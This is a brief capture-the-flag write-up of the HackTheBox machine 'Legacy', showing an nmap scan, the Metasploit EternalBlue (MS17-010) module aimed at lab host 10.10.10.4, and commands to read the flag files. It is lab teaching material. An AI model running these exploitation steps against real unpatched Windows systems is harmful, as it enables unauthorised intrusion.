HTB: Legacy

Platform: Windows  |  Difficulty: Easy  |  Technique: EternalBlue

This was one of my first HackTheBox machines and a great intro to legacy Windows exploitation. It uses SMB and EternalBlue (MS17-010).

1. Nmap Scan

nmap -sC -sV -oA legacy 10.10.10.4

The scan shows ports 139 and 445 open, with an SMB service running on an unpatched Windows XP box.

2. Exploitation

I used the following Metasploit module to gain access:

msfconsole use exploit/windows/smb/ms17_010_eternalblue set RHOST 10.10.10.4 run

3. Post Exploitation

After gaining a shell, I used basic enumeration to find user and root flags:

whoami dir C:\Users type user.txt type root.txt
